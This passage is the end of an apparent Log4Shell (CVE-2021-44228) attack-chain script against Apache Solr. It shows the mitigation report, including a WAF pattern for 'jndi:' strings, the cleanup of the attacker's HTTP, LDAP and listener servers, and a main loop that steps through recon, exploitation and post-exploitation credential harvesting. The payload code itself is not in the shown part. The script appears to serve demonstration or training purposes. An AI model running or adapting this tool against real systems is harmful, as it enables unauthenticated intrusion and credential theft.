        ("T1071.001", "Monitor for anomalous outbound connections from application servers"),
        ("T1203",     "Set -Dcom.sun.jndi.ldap.object.trustURLCodebase=false (Java 8u191+ default)"),
        ("T1552.001", "Encrypt credentials in config files; use secrets management"),
        ("All",       "Deploy WAF rules to detect ${{jndi: patterns in HTTP traffic"),
        ("All",       "Enable Solr authentication — Admin API should not be publicly accessible"),
        ("All",       "Run Solr in a container with restricted egress network policy"),
        ("All",       "Implement runtime application self-protection (RASP) for JNDI filtering"),
    ]
    for tid, rec in recs:
        console.print(f"  [green]▸[/green] [dim][{tid}][/dim] {rec}")
    console.print()

    # Final impact
    console.print(Panel(
        "[bold red]IMPACT SUMMARY[/bold red]\n\n"
        "  An [bold]unauthenticated[/bold] attacker achieved [bold red]Remote Code Execution[/bold red]\n"
        "  by sending a single HTTP request containing a JNDI payload.\n\n"
        "  [bold]No credentials were needed.[/bold]\n"
        "  [bold]No prior access was required.[/bold]\n"
        "  [bold]The exploit leaves minimal traces in standard HTTP logs.[/bold]\n\n"
        "  The victim's JVM actively fetched and executed attacker-controlled\n"
        "  code — the server came to the attacker, not the other way around.",
        title="[bold red]CVE-2021-44228 — CVSS 10.0[/bold red]",
        border_style="bold red",
        padding=(1, 4),
    ))
    console.print()

# ─────────────────────────────────────────────────────────────────────────────
#  Cleanup
# ─────────────────────────────────────────────────────────────────────────────

def cleanup():
    for key in ("http_server_proc", "ldap_server_proc", "listener_proc"):
        proc = STATE.get(key)
        if proc and proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()

# ─────────────────────────────────────────────────────────────────────────────
#  Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    banner()
    configure()

    console.print(Panel(
        "  [cyan]Phase 1[/cyan]  Reconnaissance              (port scan, Solr fingerprint)\n"
        "  [cyan]Phase 2[/cyan]  Vulnerability Detection      (OOB JNDI callback)\n"
        "  [cyan]Phase 3[/cyan]  Exploit Preparation           (compile payload, start infra)\n"
        "  [cyan]Phase 4[/cyan]  Exploitation                  (trigger → LDAP → class → RCE)\n"
        "  [cyan]Phase 5[/cyan]  Post-Exploitation             (enum, credentials, data)\n"
        "  [cyan]Phase 6[/cyan]  Report & ATT&CK Mapping",
        title="[bold]Attack Chain Overview[/bold]",
        border_style="blue",
    ))
    console.print()

    phases = [
        ("Reconnaissance",         phase_recon),
        ("Vulnerability Detection", phase_detection),
        ("Exploit Preparation",     phase_preparation),
        ("Exploitation",            phase_exploit),
        ("Post-Exploitation",       phase_post_exploit),
        ("Report",                  phase_report),
    ]

    try:
        for i, (name, func) in enumerate(phases, 1):
            try:
                func()
                if i < len(phases):
                    if not Confirm.ask(
                        f"\n  [bold cyan]Phase {i} ({name}) complete. Continue to Phase {i+1}?[/bold cyan]",
                        default=True,
                    ):
                        info("Skipping remaining phases, jumping to report...")
                        phase_report()
                        break
            except KeyboardInterrupt:
                console.print(f"\n[yellow]Phase {i} ({name}) interrupted.[/yellow]")
                if not Confirm.ask("  Continue to next phase?", default=True):
                    break
            except Exception as exc:
                err(f"Phase {i} ({name}): {exc}")
                console.print_exception(show_locals=False)
                if not Confirm.ask("  Continue despite error?", default=True):
                    break
    finally:
        console.print()
        if Confirm.ask("  [bold]Clean up exploit infrastructure (kill HTTP/LDAP/listener)?[/bold]",
                       default=True):
            cleanup()
            ok("Infrastructure cleaned up")
        else:
            info("Processes left running — clean up manually when done")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]Aborted.[/red]")
        cleanup()
        sys.exit(1)
